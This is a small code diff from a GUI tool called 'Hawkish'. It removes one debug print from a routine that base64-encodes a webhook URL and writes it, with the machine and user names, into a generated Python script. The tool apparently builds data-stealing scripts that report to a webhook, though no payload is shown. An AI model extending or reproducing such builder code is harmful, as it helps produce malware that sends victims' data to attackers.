@@ -428,7 +428,6 @@ class Hawkish(customtkinter.CTk):
         b64 = webhook.encode('utf-8')
         bs64 = base64.b64encode(b64)
         with open(f"{filename}.py", "w", encoding="utf-8") as f:
-            print(str(self.api_link_input.get()))
             f.write(code.replace('%_config_4888%', str(bs64).replace("b'", "").replace("'", ""))
                     .replace("%PC_CREATOR%", os.getenv("COMPUTERNAME"))
                     .replace("%USER_CREATOR%", custom_username)
